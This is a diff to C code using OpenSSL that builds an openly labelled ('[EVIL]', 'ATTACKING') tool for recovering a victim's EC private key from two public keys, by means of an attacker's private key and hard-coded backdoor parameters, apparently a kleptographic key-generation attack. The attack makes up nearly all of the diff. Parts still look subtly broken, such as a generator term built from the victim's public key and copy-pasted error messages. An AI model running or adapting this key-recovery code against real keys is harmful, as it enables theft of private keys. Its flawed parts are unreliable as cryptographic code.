@@ -126,7 +126,7 @@ BIGNUM* _load_bn(FILE* fd){
 void _print(char *msg){
     int verbose = 0;
     if(verbose)
-        printf("[EVIL] %s", msg);
+        printf("[EVIL] %s\n", msg);
 }
 
 void _perror(char *msg){
@@ -286,7 +286,7 @@ int ec_main(int argc, char **argv)
         if (informat == FORMAT_ASN1) {
             attacker = d2i_ECPrivateKey_bio(in1, NULL);
             eckey1 = d2i_EC_PUBKEY_bio(in2, NULL);
-            eckey1 = d2i_EC_PUBKEY_bio(in3, NULL);
+            eckey2 = d2i_EC_PUBKEY_bio(in3, NULL);
         } else if (informat == FORMAT_ENGINE) {
             BIO_printf(bio_err, "All keys should be in ASN1 format (PEM)\n");
         } else {
@@ -311,28 +311,18 @@ int ec_main(int argc, char **argv)
         }
 
         // now we have attacker, eckey1 and eckey2
-        // some checks
         BN_CTX *ctx = NULL;
-        if ((ctx = BN_CTX_new()) == NULL){
+        if ((ctx = BN_CTX_new()) == NULL)
             _perror("can't create ctx");
-        }
 
         // compare groups
         EC_GROUP* kgroup = EC_KEY_get0_group(eckey1);
-        if(-1 == EC_GROUP_cmp(eckey1->group, eckey2->group, ctx)){
-            _perror("keys are in different groups");
-        }
-        if(-1 == EC_GROUP_cmp(kgroup, eckey2->group, ctx)){
+        if(-1 == EC_GROUP_cmp(eckey1->group, eckey2->group, ctx))
+            _perror("keys pkey1 and pkey2 are in different groups");
+        if(-1 == EC_GROUP_cmp(kgroup, eckey2->group, ctx))
             _perror("key and attacker's key are in different groups");
-        }
 
         // ATTACKING
-        // Z1 = a * eckey1 + b * v * eckey1
-        // Z1 = Z1a        + Z1b
-        EC_POINT* Z1  = EC_POINT_new(kgroup);
-        EC_POINT* Z1a = EC_POINT_new(kgroup);
-        EC_POINT* Z1b = EC_POINT_new(kgroup);
-
         // a,b,h,e
         BIGNUM* params[4];
         params[0] = BN_new();
@@ -344,48 +334,59 @@ int ec_main(int argc, char **argv)
         params[3] = BN_new();
         BN_hex2bn(&params[3], "1114344294863AF852984EEB366E37088D36A302A6D748A5B5E12695D28E9A73");
 
-        // calculate Z1
-        {
-            // Z1a = a * eckey1
-            if(!EC_POINT_copy(Z1a, eckey1->pub_key)) _perror("Z1a=pub");
-            EC_POINT_mul(kgroup, Z1a, params[0], NULL, NULL, ctx);
-
-            // Z1b = b * v * eckey1
-            if(!EC_POINT_copy(Z1a, eckey1->pub_key)) _perror("Z1b=pub");
-            EC_POINT_mul(kgroup, Z1b, attacker->priv_key, NULL, NULL, ctx);
-            EC_POINT_mul(kgroup, Z1b, params[1], NULL, NULL, ctx);
-
-            // Z = Z1a + Z1b
-            if(!EC_POINT_add(kgroup, Z1, Z1a, Z1b, ctx)) _perror("Z1=Z1a+Z1b");
-        }
-
         // for each possible j, u from {0,1}:
         for(int j=0; j<2; j++){
             for(int u=0; u<2; u++){
-                // Z2 = Z1 + h*j*G + e*u*V
-                // Z2 = Z1 + Z2a   + Z2b
-                EC_POINT* Z2  = EC_POINT_new(kgroup);
-                EC_POINT* Z2a = EC_POINT_new(kgroup);
-                EC_POINT* Z2b = EC_POINT_new(kgroup);
+                // Z2 = a M1 + b v M1 + h j G + e u V
+                const int points_total = 4;
+                const EC_POINT* points[points_total];
 
-                // Z2a = h*j*G
-                if(j == 1){
-                    if(!EC_POINT_copy(Z2a, Z2)) _perror("Z1b=pub");
-                    EC_POINT_mul(kgroup, Z2a, params[2], NULL, NULL, ctx);
+                { // 0: a * eckey1
+                    points[0]  = EC_POINT_new(kgroup);
+                    if(!EC_POINT_copy(points[0], eckey1->pub_key)) 
+                        _perror("points[0]=pub_key1");
+                    if(!EC_POINT_mul(kgroup, points[0], params[0], NULL, NULL, ctx)) 
+                        _perror("points[0]*=priv_key");
+                }
+                { // 1: b * v * eckey1
+                    points[1]  = EC_POINT_new(kgroup);
+                    if(!EC_POINT_copy(points[1], eckey1->pub_key)) 
+                        _perror("points[1]=pub_key1");
+                    if(!EC_POINT_mul(kgroup, points[1], attacker->priv_key, NULL, NULL, ctx)) 
+                        _perror("points[1]*=attacker_priv_key");
+                    if(!EC_POINT_mul(kgroup, points[1], params[1], NULL, NULL, ctx)) 
+                        _perror("points[1]*=b");
                 }
 
-                // Z2b = e*u*V
-                if(u == 1){
-                    if(!EC_POINT_copy(Z2b, attacker->pub_key)) _perror("Z1b=pub");
-                    EC_POINT_mul(kgroup, Z2a, params[3], NULL, NULL, ctx);
+                { // 2: h*j*G
+                    points[2]  = EC_POINT_new(kgroup);
+                    if(!EC_POINT_copy(points[2], eckey1->pub_key)) 
+                        _perror("points[2]=V");
+                    if(j == 1) {
+                        if(!EC_POINT_mul(kgroup, points[2], params[2], NULL, NULL, ctx)) 
+                            _perror("points[2]*=h");
+                    } else {
+                        EC_POINT_set_to_infinity(kgroup, points[2]); // G + infinity = G
+                    }
+                }
+                { // 3: e*u*V
+                    points[3]  = EC_POINT_new(kgroup);
+                    if(!EC_POINT_copy(points[3], attacker->pub_key)) 
+                        _perror("points[3]=V");
+                    if(u == 1) {
+                        if(!EC_POINT_mul(kgroup, points[3], params[3], NULL, NULL, ctx)) 
+                            _perror("points[3]*=e");
+                    } else {
+                        EC_POINT_set_to_infinity(kgroup, points[3]); // G + infinity = G
+                    }
                 }
 
-                // Z2 = Z1 + Z2a
-                if(!EC_POINT_add(kgroup, Z2, Z1, Z2a, ctx)) _perror("Z2=Z1+Z2a");
-
-                // Z2 = Z2 + Z2b
-                if(!EC_POINT_add(kgroup, Z2, Z2, Z2b, ctx)) _perror("Z2+=Z2b");
-
+                EC_POINT* Z2 = points[0];
+                for(int i=1; i<points_total; i++){
+                    if(!EC_POINT_add(kgroup, points[0], points[0], points[i], ctx)) 
+                        _perror("points[3]*=e");
+                }
+        
                 // c2 = H(Z2)
                 BIGNUM* c2 = _H(Z2->X);
 
@@ -394,23 +395,24 @@ int ec_main(int argc, char **argv)
                 EC_POINT_mul(kgroup, M2, c2, NULL, NULL, ctx);
 
                 // if points are equal
+                _print("######## Comparing these two points: ########");
+                _print(EC_POINT_point2hex(kgroup, M2, POINT_CONVERSION_UNCOMPRESSED, ctx));
+                _print(EC_POINT_point2hex(kgroup, eckey2->pub_key, POINT_CONVERSION_UNCOMPRESSED, ctx));
                 if(0 == EC_POINT_cmp(kgroup, M2, eckey2->pub_key, ctx)){
                     _print_bn(c2, "Success! The private key is: ");
                     exit(0);
                 }
 
-                EC_POINT_free(Z2);
-                EC_POINT_free(Z2a);
-                EC_POINT_free(Z2b);
+                // clean up
+                BN_free(c2);
                 EC_POINT_free(M2);
+                for(int i=0; i<points_total; i++){
+                    EC_POINT_free(points[i]);
+                }
             }
         }
 
         printf("Can't restore private key :(\n");
-
-        EC_POINT_free(Z1);
-        EC_POINT_free(Z1a);
-        EC_POINT_free(Z1b);
 
         goto end;
     }
